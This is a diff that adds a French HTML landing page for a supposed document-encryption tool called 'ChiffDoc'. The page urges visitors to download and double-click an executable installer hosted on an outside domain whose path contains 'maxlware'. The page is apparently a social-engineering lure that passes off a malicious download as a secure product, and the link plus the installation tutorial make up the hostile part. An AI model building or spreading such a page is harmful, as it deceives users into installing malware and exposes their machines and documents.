@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Installation ChiffDoc</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap');
+
+  * {
+    box-sizing: border-box;
+  }
+
+  body {
+    margin: 0;
+    font-family: 'Inter', sans-serif;
+    background: linear-gradient(135deg, #2b2f4a, #4e5481);
+    color: #f0f0f5;
+    display: flex;
+    flex-direction: column;
+    min-height: 100vh;
+    justify-content: center;
+    align-items: center;
+    padding: 20px;
+  }
+
+  .container {
+    background: rgba(40, 44, 68, 0.85);
+    padding: 40px;
+    border-radius: 15px;
+    box-shadow: 0 10px 25px rgba(0, 0, 0, 0.4);
+    max-width: 420px;
+    text-align: center;
+  }
+
+  h1 {
+    margin-bottom: 15px;
+    font-weight: 700;
+    font-size: 2.4rem;
+    color: #61dafb;
+  }
+
+  p.description {
+    font-size: 1.1rem;
+    margin-bottom: 30px;
+    line-height: 1.4;
+  }
+
+  .btn-install {
+    display: inline-block;
+    background: #61dafb;
+    color: #222;
+    font-weight: 700;
+    padding: 15px 45px;
+    font-size: 1.2rem;
+    border-radius: 50px;
+    cursor: pointer;
+    text-decoration: none;
+    transition: background 0.3s ease, transform 0.2s ease;
+    box-shadow: 0 6px 10px rgba(97, 218, 251, 0.5);
+    user-select: none;
+  }
+  .btn-install:hover {
+    background: #4bb8e9;
+    transform: translateY(-3px);
+  }
+  .btn-install:active {
+    transform: translateY(0);
+    box-shadow: none;
+  }
+
+  #message {
+    margin-top: 20px;
+    font-size: 1rem;
+    color: #90ee90;
+    min-height: 1.2em;
+  }
+
+  #tutorial {
+    margin-top: 30px;
+    text-align: left;
+    background: rgba(97, 218, 251, 0.1);
+    border-radius: 12px;
+    padding: 15px 20px;
+    color: #cdeffd;
+    font-size: 1rem;
+    display: none;
+    user-select: text;
+    line-height: 1.4;
+  }
+
+  footer {
+    margin-top: 40px;
+    font-size: 0.9rem;
+    color: #a0a0b2;
+  }
+
+  @media (max-width: 480px) {
+    .container {
+      width: 100%;
+      padding: 30px 20px;
+      border-radius: 12px;
+    }
+  }
+</style>
+</head>
+<body>
+  <div class="container" role="main">
+    <h1>Bienvenue sur ChiffDoc</h1>
+    <p class="description">
+      L'outil simple et sécurisé pour chiffrer vos documents en toute tranquillité.<br />
+      Cliquez sur le bouton ci-dessous pour télécharger et installer votre logiciel.
+    </p>
+    <a href="https://traficoo.eletrix.fr/data/maxlware/exe/ChiffDoc_Installer.exe" class="btn-install" id="installBtn" download>
+      Télécharger l'installateur
+    </a>
+    <div id="message" aria-live="polite"></div>
+    <div id="tutorial" aria-live="polite">
+      <h2>Tutoriel d'installation rapide</h2>
+      <ol>
+        <li>Une fois le fichier téléchargé, ouvrez-le en double-cliquant dessus.</li>
+        <li>Suivez les instructions à l'écran pour installer ChiffDoc.</li>
+        <li>À la fin de l'installation, lancez le logiciel depuis le menu démarrer ou le bureau.</li>
+        <li>Commencez à chiffrer vos documents en toute sécurité !</li>
+      </ol>
+    </div>
+  </div>
+
+  <footer>
+    &copy; 2025 ChiffDoc. Tous droits réservés.
+  </footer>
+
+<script>
+  const btn = document.getElementById('installBtn');
+  const message = document.getElementById('message');
+  const tutorial = document.getElementById('tutorial');
+
+  btn.addEventListener('click', () => {
+    message.textContent = 'Le téléchargement va bientôt commencer...';
+    tutorial.style.display = 'block';
+  });
+</script>
+</body>
+</html>
